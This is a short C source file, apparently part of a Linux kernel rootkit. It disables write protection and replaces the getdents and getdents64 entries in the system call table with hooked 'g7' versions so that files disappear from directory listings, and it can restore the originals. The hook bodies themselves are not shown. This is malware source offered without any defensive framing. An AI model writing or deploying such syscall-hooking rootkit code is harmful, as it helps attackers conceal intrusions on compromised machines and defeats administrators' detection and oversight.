#include "filehide.h"
#include "hook.h"

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

void
hide_files(void)
{
    disable_protection();
    sys_calls[__NR_getdents] = (void *)g7_getdents;
    sys_calls[__NR_getdents64] = (void *)g7_getdents64;
    enable_protection();
}

void
unhide_files(void)
{
    disable_protection();
    sys_calls[__NR_getdents] = (void *)sys_getdents;
    sys_calls[__NR_getdents64] = (void *)sys_getdents64;
    enable_protection();
}
